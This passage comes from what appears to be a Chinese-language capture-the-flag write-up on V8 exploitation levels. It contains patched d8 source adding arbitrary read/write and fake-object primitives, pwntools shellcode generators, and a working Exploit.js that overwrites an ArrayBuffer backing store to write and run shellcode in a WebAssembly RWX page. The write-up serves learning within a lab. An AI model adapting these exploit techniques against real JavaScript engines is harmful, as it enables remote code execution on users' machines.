class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>n)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(int_arr))</span><br></pre></td></tr></table></figure>

<p>再把讀到的變成 js exploit  </p>
<p><strong>sol.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">	dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">	<span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit =[<span class="title function_">i2f</span>(<span class="number">0x2434810101666068n</span>),<span class="title function_">i2f</span>(<span class="number">0x6567b84801010101n</span>),<span class="title function_">i2f</span>(<span class="number">0x48506c667461632fn</span>),<span class="title function_">i2f</span>(<span class="number">0x656c6c6168632fb8n</span>),<span class="title function_">i2f</span>(<span class="number">0x31d231e78948506en</span>),<span class="title function_">i2f</span>(<span class="number">0x0000050f583b6af6n</span>)]</span><br><span class="line"></span><br><span class="line">exploit.<span class="title function_">run</span>()</span><br></pre></td></tr></table></figure>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>透過三個函數，分別給了物件地址的任意讀取，任意讀寫 32 bits 短地址<br>V8 在 2020 年後，就開始了地址壓縮的設計：<br>參考：<a target="_blank" rel="noopener" href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-5/">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-5/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                        |----- 32 bits -----|</span><br><span class="line">Pointer:                |_____address_____w1|</span><br><span class="line">Smi:                    |___int31_value____0|</span><br></pre></td></tr></table></figure>
<p>具體算法就是每個物件組都有個 offset，再去加上他紀錄的地址(w1如果是1代表是地址, 0 是 in31_value，用以區隔兩種變數)<br>利用流程可以參考：<a target="_blank" rel="noopener" href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6/">https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6/</a><br><strong>diff patch</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">hacker@v8-exploitation~level2:/challenge$ cat patch</span><br><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index facf0d86d79.<span class="number">.6</span>b31fe2c371 <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ <span class="number">-1283</span>,<span class="number">6</span> +<span class="number">1283</span>,<span class="number">64</span> @@ <span class="class"><span class="keyword">struct</span> <span class="title">ModuleResolutionData</span> &#123;</span></span><br><span class="line"> </span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line"> </span><br><span class="line">+<span class="type">void</span> <span class="title function_">Shell::GetAddressOf</span><span class="params">(<span class="type">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> &#123;</span><br><span class="line">+  v8::Isolate* isolate = info.GetIsolate();</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (info.Length() == <span class="number">0</span>) &#123;</span><br><span class="line">+    isolate-&gt;ThrowError(<span class="string">&quot;First argument must be provided&quot;</span>);</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  internal::Handle&lt;internal::Object&gt; arg = Utils::OpenHandle(*info[<span class="number">0</span>]);</span><br><span class="line">+  <span class="keyword">if</span> (!IsHeapObject(*arg)) &#123;</span><br><span class="line">+    isolate-&gt;ThrowError(<span class="string">&quot;First argument must be a HeapObject&quot;</span>);</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+  internal::Tagged&lt;internal::HeapObject&gt; obj = internal::Cast&lt;internal::HeapObject&gt;(*arg);</span><br><span class="line">+</span><br><span class="line">+  <span class="type">uint32_t</span> address = static_cast&lt;<span class="type">uint32_t</span>&gt;(obj-&gt;address());</span><br><span class="line">+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="type">void</span> <span class="title function_">Shell::ArbRead32</span><span class="params">(<span class="type">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> &#123;</span><br><span class="line">+	Isolate *isolate = info.GetIsolate();</span><br><span class="line">+	<span class="keyword">if</span> (info.Length() != <span class="number">1</span>) &#123;</span><br><span class="line">+		isolate-&gt;ThrowError(<span class="string">&quot;Need exactly one argument&quot;</span>);</span><br><span class="line">+		<span class="keyword">return</span>;</span><br><span class="line">+	&#125;</span><br><span class="line">+	internal::Handle&lt;internal::Object&gt; arg = Utils::OpenHandle(*info[<span class="number">0</span>]);</span><br><span class="line">+	<span class="keyword">if</span> (!IsNumber(*arg)) &#123;</span><br><span class="line">+		isolate-&gt;ThrowError(<span class="string">&quot;Argument should be a number&quot;</span>);</span><br><span class="line">+		<span class="keyword">return</span>;</span><br><span class="line">+	&#125;</span><br><span class="line">+	internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</span><br><span class="line">+	internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</span><br><span class="line">+	<span class="type">uint32_t</span> addr = static_cast&lt;<span class="type">uint32_t</span>&gt;(internal::Object::NumberValue(*arg));</span><br><span class="line">+	<span class="type">uint64_t</span> full_addr = base_addr + (<span class="type">uint64_t</span>)addr;</span><br><span class="line">+	<span class="type">uint32_t</span> result = *(<span class="type">uint32_t</span> *)full_addr;</span><br><span class="line">+	info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, result));</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="type">void</span> <span class="title function_">Shell::ArbWrite32</span><span class="params">(<span class="type">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> &#123;</span><br><span class="line">+	Isolate *isolate = info.GetIsolate();</span><br><span class="line">+	<span class="keyword">if</span> (info.Length() != <span class="number">2</span>) &#123;</span><br><span class="line">+		isolate-&gt;ThrowError(<span class="string">&quot;Need exactly 2 arguments&quot;</span>);</span><br><span class="line">+		<span class="keyword">return</span>;</span><br><span class="line">+	&#125;</span><br><span class="line">+	internal::Handle&lt;internal::Object&gt; arg1 = Utils::OpenHandle(*info[<span class="number">0</span>]);</span><br><span class="line">+	internal::Handle&lt;internal::Object&gt; arg2 = Utils::OpenHandle(*info[<span class="number">1</span>]);</span><br><span class="line">+	<span class="keyword">if</span> (!IsNumber(*arg1) || !IsNumber(*arg2)) &#123;</span><br><span class="line">+		isolate-&gt;ThrowError(<span class="string">&quot;Arguments should be numbers&quot;</span>);</span><br><span class="line">+		<span class="keyword">return</span>;</span><br><span class="line">+	&#125;</span><br><span class="line">+	internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</span><br><span class="line">+	internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</span><br><span class="line">+	<span class="type">uint32_t</span> addr = static_cast&lt;<span class="type">uint32_t</span>&gt;(internal::Object::NumberValue(*arg1));</span><br><span class="line">+	<span class="type">uint32_t</span> value = static_cast&lt;<span class="type">uint32_t</span>&gt;(internal::Object::NumberValue(*arg2));</span><br><span class="line">+	<span class="type">uint64_t</span> full_addr = base_addr + (<span class="type">uint64_t</span>)addr;</span><br><span class="line">+	*(<span class="type">uint32_t</span> *)full_addr = value;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">... 其他定義面的東西</span><br></pre></td></tr></table></figure>
<p>其中，在 V8 裡能穩定產生一塊 rwx 頁的方法就是製作一個 WebAssembly 物件，而他與該 rwx 塊會有個固定 offset，如果可以任意讀取物件記憶體就能算出 rwx 塊的地址。<br>但今天的問題有兩個，首先，我們只能寫入短地址，而該頁的 base 和 wasm 物件的 base 會不一樣，這時候就要用別的方法寫入。<br>Array Buffer 的結構：<br><a target="_blank" rel="noopener" href="https://v8docs.nodesource.com/node-13.2/d5/d6e/classv8_1_1_array_buffer.html">https://v8docs.nodesource.com/node-13.2/d5/d6e/classv8_1_1_array_buffer.html</a><br>當中的 BackingStore 是最重要的部分之一，指向 Array Buffer 實際儲存的資料地址  </p>
<p>可以用 d8 配合 <code>--allow-natives-syntax</code> 參數，並在原始 js 裡面加上 <code>%DebugPrint(buf)</code> 讀取該 buf 的資料，並且在 gdb 中用 <code>find</code> 指令抓出 Array Buffer 地址會寫在哪個指標上：(P.S., 加上 while loop 可以卡住程式做 debugger 切進去)<br><strong>test.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(buf);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>開始 debug d8<br><img src="https://hackmd.io/_uploads/SkBAaCYyel.png" alt="image"><br>獲取 buf 地址（記得 -1）還有 backing_store 的<br><img src="https://hackmd.io/_uploads/BJVapCFJeg.png" alt="image">  </p>
<p>find 指令尋找 指標並算出 offset  </p>
<p><img src="https://hackmd.io/_uploads/H1YNACKyee.png" alt="image"></p>
<p>獲得單純的 ArrayBuffer 地址任意寫 &#x3D;&gt; 記憶體任意寫後，因為當前是 32 bits 所以要拆兩次寫入 rwx 頁地址  </p>
<p>第二點，也是最麻煩的，每變動一次程式碼， RWX 頁的 Offset 就會變動，所以每次都要重新要 gdb 追進去，最後一個小技巧就是不要用 DebugPrint，因為 debug 版也會讓他 offset 變化，直接輸出他的壓縮地址再加回去他本來應該在地記憶體塊就行，邊寫邊 debug。  </p>
<p>最後 wasm 塊之所以會有 rwx 就是要把記憶體仔入並執行，所以透過前面製造的 f 函數去呼叫 wasm 塊中的 main 就能自然執行剛剛寫入 rwx 的 shellcode 了！（對，要記得寫　shellcode 進去）  </p>
<p><strong>Debug 技巧</strong>：<br>最後到這段寫入的時候：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ArbWrite32</span>(backing_store_addr, rwx_page_addrl);</span><br><span class="line"><span class="title class_">ArbWrite32</span>(backing_store_addr+<span class="number">4</span>, rwx_page_addrh);</span><br><span class="line"><span class="comment">//ArbWrite32(backing_store_addr, buf_data_addrl);</span></span><br><span class="line"><span class="comment">//ArbWrite32(backing_store_addr+4, buf_data_addrh);</span></span><br></pre></td></tr></table></figure>
<p>在拿到地址其實是錯的時候會直接吃 sig fault，我的解決方法是改成寫回去原本的地址，因為都是執行兩次寫入，基於一些神奇的理由執行上兩行跟下兩行對記憶體 layout 不會改動？<br>最後要記得保留剛剛讀那些變數出來的程式，不然 offset 又双要重算<br>是說這邊因為 offset 都在某個範圍內好像可以直接寫個記憶體掃描啥的，但好麻煩 qq，先給自己挖個坑  </p>
<p>生成 int32 shellcodes:  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># payload = asm(shellcraft.execve(&quot;/bin/sh&quot;, 0, 0))</span></span><br><span class="line">payload = asm(<span class="string">&#x27;nop\nnop\nnop\nnop\n&#x27;</span>*<span class="number">3</span>+shellcraft.execve(<span class="string">&quot;/challenge/catflag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">int_arr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">4</span>):</span><br><span class="line">    int_arr.append(<span class="string">f&quot;0x<span class="subst">&#123;payload[i:i+<span class="number">4</span>].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>)[::-<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(int_arr))</span><br></pre></td></tr></table></figure>

<p><strong>Exploit.js</strong> (前面加上 NOP \x90 是以防中間執行會汙染到 RWX 最前面的塊)  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\nvmmap to get the RWX page address&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search -x [little_endian_address]&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Subtract the address of wasm_instance from the address of our pointer&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x01666068</span>,<span class="number">0x24348101</span>,<span class="number">0x01010101</span>,<span class="number">0x6567b848</span>,<span class="number">0x7461632f</span>,<span class="number">0x48506c66</span>,<span class="number">0x68632fb8</span>,<span class="number">0x656c6c61</span>,<span class="number">0x8948506e</span>,<span class="number">0x31d231e7</span>,<span class="number">0x583b6af6</span>,<span class="number">0x0000050f</span>];</span><br><span class="line"><span class="variable constant_">WASM_PAGE_OFFSET</span> = <span class="number">0x2c3d8</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">GetAddressOf</span>(wasm_instance).<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line">rwx_page_addrl = <span class="title class_">ArbRead32</span>(<span class="title class_">GetAddressOf</span>(wasm_instance) + <span class="variable constant_">WASM_PAGE_OFFSET</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rwx_page_addrl.<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line">rwx_page_addrh = <span class="title class_">ArbRead32</span>(<span class="title class_">GetAddressOf</span>(wasm_instance) + <span class="variable constant_">WASM_PAGE_OFFSET</span>+<span class="number">4</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rwx_page_addrh.<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="comment">// create dataview for easy memory writing</span></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">4</span>);</span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// move dataview to RWX memory</span></span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="title class_">GetAddressOf</span>(buf);</span><br><span class="line"><span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x24</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead32</span>(backing_store_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">buf_data_addrl = <span class="title class_">ArbRead32</span>(backing_store_addr);</span><br><span class="line">buf_data_addrh = <span class="title class_">ArbRead32</span>(backing_store_addr+<span class="number">4</span>);</span><br><span class="line"><span class="title class_">ArbWrite32</span>(backing_store_addr, rwx_page_addrl);</span><br><span class="line"><span class="title class_">ArbWrite32</span>(backing_store_addr+<span class="number">4</span>, rwx_page_addrh);</span><br><span class="line"><span class="comment">//ArbWrite32(backing_store_addr, buf_data_addrl);</span></span><br><span class="line"><span class="comment">//ArbWrite32(backing_store_addr+4, buf_data_addrh);</span></span><br><span class="line"><span class="comment">// copy shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setUint32</span>(<span class="number">4</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jump to RWX memory</span></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>…打 v8 好折磨（</p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>任意取得地址和任意獲得某地址開始的 FakeObject<br><strong>patch</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index facf0d86d79.<span class="number">.0299</span>ed26802 <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ <span class="number">-1283</span>,<span class="number">6</span> +<span class="number">1283</span>,<span class="number">52</span> @@ <span class="class"><span class="keyword">struct</span> <span class="title">ModuleResolutionData</span> &#123;</span></span><br><span class="line"> </span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line"> </span><br><span class="line">+<span class="type">void</span> <span class="title function_">Shell::GetAddressOf</span><span class="params">(<span class="type">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> &#123;</span><br><span class="line">+  v8::Isolate* isolate = info.GetIsolate();</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (info.Length() == <span class="number">0</span>) &#123;</span><br><span class="line">+    isolate-&gt;ThrowError(<span class="string">&quot;First argument must be provided&quot;</span>);</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  internal::Handle&lt;internal::Object&gt; arg = Utils::OpenHandle(*info[<span class="number">0</span>]);</span><br><span class="line">+  <span class="keyword">if</span> (!IsHeapObject(*arg)) &#123;</span><br><span class="line">+    isolate-&gt;ThrowError(<span class="string">&quot;First argument must be a HeapObject&quot;</span>);</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+  internal::Tagged&lt;internal::HeapObject&gt; obj = internal::Cast&lt;internal::HeapObject&gt;(*arg);</span><br><span class="line">+</span><br><span class="line">+  <span class="type">uint32_t</span> address = static_cast&lt;<span class="type">uint32_t</span>&gt;(obj-&gt;address());</span><br><span class="line">+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="type">void</span> <span class="title function_">Shell::GetFakeObject</span><span class="params">(<span class="type">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> &#123;</span><br><span class="line">+    v8::Isolate *isolate = info.GetIsolate();</span><br><span class="line">+    Local&lt;v8::Context&gt; context = isolate-&gt;GetCurrentContext();</span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">if</span> (info.Length() != <span class="number">1</span>) &#123;</span><br><span class="line">+        isolate-&gt;ThrowError(<span class="string">&quot;Need exactly one argument&quot;</span>);</span><br><span class="line">+        <span class="keyword">return</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    Local&lt;v8::Uint32&gt; arg;</span><br><span class="line">+    <span class="keyword">if</span> (!info[<span class="number">0</span>]-&gt;ToUint32(context).ToLocal(&amp;arg)) &#123;</span><br><span class="line">+        isolate-&gt;ThrowError(<span class="string">&quot;Argument must be a number&quot;</span>);</span><br><span class="line">+        <span class="keyword">return</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+    </span><br><span class="line">+    <span class="type">uint32_t</span> addr = arg-&gt;Value();</span><br><span class="line">+</span><br><span class="line">+    internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</span><br><span class="line">+    internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</span><br><span class="line">+    <span class="type">uint64_t</span> full_addr = base_addr + (<span class="type">uint64_t</span>)addr;</span><br><span class="line">+</span><br><span class="line">+    internal::Tagged&lt;internal::HeapObject&gt; obj = internal::HeapObject::FromAddress(full_addr);</span><br><span class="line">+    internal::Isolate *i_isolate = reinterpret_cast&lt;internal::Isolate*&gt;(isolate);</span><br><span class="line">+    internal::Handle&lt;internal::Object&gt; <span class="title function_">obj_handle</span><span class="params">(obj, i_isolate)</span>;</span><br><span class="line">+    info.GetReturnValue().Set(ToApiHandle&lt;v8::Value&gt;(obj_handle));</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
<p>這題與上一題基本一樣，唯一的點是要去偽造一個 Object 來完成 OOB 的兩個功能。  </p>
<p>一個 Array 的結構基本要有 map, properties, elements, len 四個值  </p>
<p>其中 map 就是指向前面貼過的文章說的 Map 結構，properties 就是他的代表信標，elements 則是最重要的，指向當下的資料地址，最後 len 就是長度  </p>
<p>而前面 Patch 中的 GetFakeObject 既然從任意記憶體直接取值，又不保障結構安全與正確，等於我們能任意控制前面說的 Array 結構。<br>這邊採用的方法是 Fake 一個讓 v8 以為是 Array 的結構，但是達成 elements 地址任意寫 &#x3D;&gt; 任意操作(r&#x2F;w)  </p>
<p>構造方法：<code>Array([map addr + properties(725), elements addr + len])</code> 其中 len 我亂寫 100， properties 從 動態 gdb 下去的時候抓得但疑似沒差？反正多 Fake 一點東西總不會錯（  </p>
<p>map addr 和 fake 的 elements addr 要從別的物件下抓  </p>
<p>先測一下，算一下要偽造一個 Object 需要的 element offset 和 map offset  </p>
